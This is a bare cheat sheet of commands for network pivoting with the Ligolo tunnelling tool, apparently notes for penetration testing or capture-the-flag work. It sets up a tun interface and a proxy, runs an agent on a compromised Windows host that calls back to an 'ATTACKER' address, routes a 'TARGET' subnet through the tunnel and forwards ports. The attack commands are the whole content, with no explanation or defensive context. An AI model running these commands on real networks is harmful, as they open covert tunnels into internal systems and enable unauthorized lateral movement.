

```
sudo ip tuntap add user root mode tun ligolo
```

```
sudo ip link set ligolo up
```

```
./proxy -selfcert
```

```
agent.exe -connect ATTACKER:11601 -retry -ignore-cert
```

```
session
```

```
start
```

```
ip route add TARGET/24 dev ligolo
```

```
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```


